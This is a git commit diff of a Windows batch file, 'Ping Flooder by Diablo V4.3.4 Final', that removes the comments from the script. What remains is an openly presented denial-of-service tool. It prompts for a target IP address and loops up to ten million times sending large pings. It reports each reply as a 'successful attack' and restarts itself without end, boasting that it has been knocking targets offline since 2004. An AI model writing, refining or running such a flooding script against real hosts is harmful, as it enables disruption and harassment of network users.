59d36143e7f39a9848b4103bf891190e6d6a3686
adbot1337 <142859936+adbot1337@users.noreply.github.com>
2024-04-22 18:00:48 -0400

    Update Ping Flooder by Diablo V4.3.4 Final.bat

--- Ping Flooder by Diablo V4.3.4 Final.bat
+++ Ping Flooder by Diablo V4.3.4 Final.bat
@@ -3,14 +3,12 @@ setlocal
 
 set "newName=Ping Flooder by Diablo V4.3.4 Final"
 
-rem Add .bat extension to the new name
 set "newName=%newName%.bat"
 
-rem Rename the batch file
 ren "%~dpnx0" "%newName%"
 
 
-REM Change the current directory to the directory containing your script
+
 set "SCRIPT_DIR=%~dp0"
 cd /d "%SCRIPT_DIR%"
 
@@ -18,21 +16,18 @@ title Ping Flooder by Diablo V4.3.4 Final
 
 
 
-REM Set the batch file to read-only
+
 attrib +R "Ping Flooder by Diablo V4.3.4 Final.bat"
 
 echo Ping Flooder by Diablo V4.3.4 Final
 echo Historical .BAT File Ping Flooder, Hitting them offline since 2004!
 
-REM Prompt user to enter IP address to target
 set /p ip=Enter the IP address:
 
-REM begin
 :begin
 
 echo Launching the Attack!
 
-REM Loop to perform ping flood attack
 setlocal enabledelayedexpansion
 set count=0
 set maxCount=10000000
@@ -40,7 +35,6 @@ set maxCount=10000000
 :loop
 if !count! equ %maxCount% goto timeout
 
-REM Perform ping command and check for reply
 ping -n 1 -l 1472 -w 100 %ip% | findstr /c:"Reply from" >nul
 if !errorlevel! equ 0 (
     echo Attack on %ip% Successful!
@@ -48,7 +42,6 @@ if !errorlevel! equ 0 (
     echo Attempted Attack on %ip% Failed!
 )
 
-REM Increment count and display progress
 set /a count+=1
 echo (Count: !count!)
 goto loop
@@ -57,5 +50,4 @@ goto loop
 echo Attack timed out, beginning to relaunch the Attack!
 timeout /t 3 >nul
 
-REM Repeat to begin
 goto begin
